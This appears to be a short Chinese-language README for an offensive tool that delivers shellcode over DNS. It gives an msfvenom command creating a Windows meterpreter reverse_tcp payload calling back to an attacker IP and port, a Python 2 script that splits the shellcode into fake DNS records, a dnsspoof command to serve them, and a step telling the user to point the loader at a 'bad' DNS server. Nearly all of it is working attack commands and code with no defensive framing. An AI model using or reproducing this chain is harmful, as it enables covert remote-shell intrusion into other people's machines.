# DNS_shellcode
DNS内网分离传输脚本
step.1
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp lhost=192.168.32.133 lport=5555 -f c > /root/safe/payload.txt

step.2
将shellcode制作成  IP+地址 的格式
Ipaddress "{payload}.domain.com"
1.1.1.0 "0xfc0x480x830xe40xf00xe8.1.com"
1.1.1.1 "0xbc0xc80x130xff0x100x08.1.com"
python格式化
#! /usr/bin/env python2.7
# -*- coding:UTF-8 -*-
a = ''
f = open("payload.txt", "rb")
line = f.readlines()[0:]
f.close()
for lines in range(len(line)):
    ipls = '1.1.1.%s' % lines
    shellcode = line[lines].replace(";","").strip().rstrip('"')+".1.com"+'"'
    text = ipls + " " + '"'+ "0x"+shellcode.lstrip('"')
    a += text.replace("\\","0")+"\n"
fn = open("dns.txt", "wb")
fn.write(a)

step.3
DNS_Server
dnsspoof -i eth0 -f dns.txt
listening msf

setp.4
Execute this python_scripts and input Your Bad_DNS_Server_IP
